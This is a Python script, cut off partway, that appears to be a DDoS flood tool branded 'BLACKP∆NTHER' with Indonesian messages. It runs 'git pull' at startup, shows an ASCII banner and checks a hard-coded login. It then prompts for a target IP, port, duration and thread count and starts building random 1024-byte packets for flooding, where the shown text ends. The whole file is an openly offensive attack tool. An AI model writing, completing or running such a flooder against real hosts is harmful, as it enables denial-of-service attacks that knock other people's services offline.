import time
import threading
import socket
import random
import sys
import os
os.system("git pull")
os.system("")

# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[97m'
    BOLD    = "\033[1m"
    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"

attemps = 0
os.system("clear")
print(" ")
print("\033[94m       ±± ±± ±±      ±± ±± ±±                      ±±±             \033[0m")
print("\033[94m       ±±       ±±   ±±       ±±                 ±± ±±             \033[0m")
print("\033[94m       ±±       ±±   ±±       ±±                    ±±             \033[0m")
print("\033[94m       ±±       ±±   ±±       ±±                    ±±             \033[0m")
print("\033[97m       ±± ±± ±±      ±± ±± ±±        ________       ±±             \033[0m")
print("\033[97m       ±±   ±±       ±±   ±±         ±± ±± ±±       ±±             \033[0m")
print("\033[97m       ±±     ±±     ±±     ±±                      ±±             \033[0m")
print("\033[97m       ±±       ±±   ±±       ±±                 ±± ±± ±±          \033[0m")
print("\033[33m _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—      \033[0m")
print("\033[1m                                                                    \033[0m")
print("\033[1m                                                                    \033[0m")
print("\033[1m                                               \033[0m")
print("\033[1m                                                \033[0m")
print("\033[33m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_\033[0m")
      
while attemps < 100:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'n0lk0ma' and password == 'n0lk0ma':
        print('Selamat datang di zona BLACKP∆NTHER!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
os.system("clear")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))
def run():
	data = random._urandom(1024)
